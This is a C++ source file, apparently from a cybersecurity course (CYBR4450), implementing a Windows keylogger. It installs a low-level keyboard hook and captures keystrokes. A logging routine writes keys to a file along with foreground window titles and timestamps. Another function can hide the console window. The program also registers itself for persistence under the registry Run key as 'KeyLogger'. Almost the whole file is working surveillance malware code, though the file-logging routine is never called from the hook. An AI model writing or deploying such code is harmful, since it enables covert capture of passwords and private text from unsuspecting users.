// CYBR4450-KeyLogger.cpp : Defines the entry point for the console application.
//

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <tchar.h>
#include <ctime>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)

// System Hook
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

clock_t startTime;

int Save(unsigned int key_stroke, const char *file);

char lastwindow[256] = {};

bool ctrlKeyPressed = false;
bool shiftKeyPressed = false;
bool capsLockKey = false;

PBYTE keyboardBuffer;

BOOL keyDown(int key) 
{
	return (GetAsyncKeyState(key) & 0x8000) != 0;
}

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{

    if (nCode >= HC_ACTION)
    {
		shiftKeyPressed = keyDown(VK_RSHIFT) || keyDown(VK_LSHIFT) || keyDown(VK_SHIFT);

		ctrlKeyPressed = keyDown(VK_RCONTROL) || keyDown(VK_LCONTROL) || keyDown(VK_CONTROL);

		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
			BYTE keyState[256] = {};
			WORD chars;
			KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
			GetKeyState(0);
			GetKeyboardState(keyState);
			if (ToAscii(key->vkCode, key->scanCode, keyState, &chars, 0))
			{
				std::string toWrite = "";
				switch ((unsigned char)chars)
				{
				case '\b':
					toWrite = "[BACKSPACE]";
					break;
				case '\r':
					toWrite = "\n";
					break;
				default:
					toWrite = chars;
				}
				std::cout << toWrite.c_str();
			}
		}

    }

    // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        MessageBox(NULL, _T("Failed to install hook!"), _T("Error"), MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(unsigned int key_stroke, const char *file)
{

    if ((key_stroke == 1) || (key_stroke == 2))
        return 0; // ignore mouse clicks


    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");


    HWND foreground = GetForegroundWindow();
    if (foreground)
    {
        char window_title[256] = {};

        GetWindowTextA(foreground, window_title, 256);

        if (strcmp(window_title, lastwindow) != 0) {
            strcpy(lastwindow, window_title);

            // get time
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);

            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
        }
    }

    
    std::cout << key_stroke << '\n';
    const char *shiftKeyText = shiftKeyPressed ? "[SHIFT]+" : "";
    const char *ctrlKeyText = ctrlKeyPressed ? "[CTRL]+" : "";

    switch (key_stroke)
    {
    case VK_BACK:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[BACKSPACE]");
        break;
    case VK_RETURN:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[ENTER]");
        break;
    case VK_SPACE:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[SPACE]");
        break;
    case VK_TAB:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[TAB]");
        break;
    case VK_ESCAPE:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[ESCAPE]");
        break;
    case VK_END:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[END]");
        break;
    case VK_HOME:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[HOME]");
        break;
    case VK_LEFT:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[LEFT]");
        break;
    case VK_UP:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[UP]");
        break;
    case VK_RIGHT:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[RIGHT]");
        break;
    case VK_DOWN:
        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[DOWN]");
        break;
    case 20:
        fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "[CAPSLOCK]");
        capsLockKey = true;
        break;
    case 48:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ")");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "0");
        break;
    case 49:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "!");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "1");
        break;
    case 50:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "@");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "2");
        break;
    case 51:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "#");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "3");
        break;
    case 52:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "$");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "4");
        break;
    case 53:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "%");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "5");
        break;
    case 54:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "^");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "6");
        break;
    case 55:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "&");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "7");
        break;
    case 56:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "*");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "8");
        break;
    case 57:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "(");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "9");
        break;
    case 91:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "{");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "[");
        break;
    case 92:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "|");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "\\");
        break;
    case 93:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "}");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "]");
        break;
    case 161:
        break;
    case 186:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ":");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ";");
        break;
    case 187:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "+");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "=");
        break;
    case 188:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "<");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ",");
        break;
    case 189:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "_");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "-");
        break;
    case 190:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ">");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ".");
        break;
    case 191:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "?");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "/");
        break;
    case 192:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "~");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "`");
        break;
    case 219:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "{");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "[");
        break;
    case 220:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "|");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "\\");
        break;
    case 221:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "}");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "]");
        break;
    case 222:
        if (shiftKeyPressed)
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "\"");
        else
            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "'");
        break;
        
    default:
        if (key_stroke >= 96 && key_stroke <= 105)
        {
            key_stroke -= 48;
        }
        else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
                                                         // check caps lock
            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
            // check shift key
            if (shiftKeyPressed) {
                lowercase = !lowercase;
            }

            if (lowercase) key_stroke += 32;
        }
        fprintf(OUTPUT_FILE, "%c", key_stroke);
        break;
    }
    //else {

    //	if (key_stroke >= 96 && key_stroke <= 105)
    //	{
    //		key_stroke -= 48;
    //	}
    //	else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
    //													 // check caps lock
    //		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
    //		// check shift key
    //		if (shiftKeyPressed) {
    //			lowercase = !lowercase;
    //		}

    //		if (lowercase) key_stroke += 32;
    //	}
    //	fprintf(OUTPUT_FILE, "%c", key_stroke);
    //}
    // NOTE: Numpad-Keys seem to print as lowercase letters

    fclose(OUTPUT_FILE);
    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif // visible

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif // invisible
}

BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwRegType = REG_SZ;
    wchar_t szPathToExe[MAX_PATH] = {};
    DWORD dwSize = sizeof(szPathToExe);

    lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
        fSuccess = (lResult == 0);
    }

    if (fSuccess)
    {
        fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    wchar_t szValue[count] = {};


    wcscpy_s(szValue, count, L"\"");
    wcscat_s(szValue, count, pathToExe);
    wcscat_s(szValue, count, L"\" ");

    if (args != NULL)
    {
        // caller should make sure "args" is quoted if any single argument has a space
        // e.g. (L"-name \"Mark Voidale\"");
        wcscat_s(szValue, count, args);
    }

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (wcslen(szValue) + 1) * 2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

void RegisterProgram()
{
    wchar_t szPathToExe[MAX_PATH];

    GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
    RegisterMyProgramForStartup(L"KeyLogger", szPathToExe, L"-foobar");
}


int main()
{
    if (IsMyProgramRegisteredForStartup(L"KeyLogger") == false)
        RegisterProgram();

    startTime = clock();

    // visibility of window
    Stealth();

    // Set the hook
    SetHook();

    // loop to keep the console application running.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}
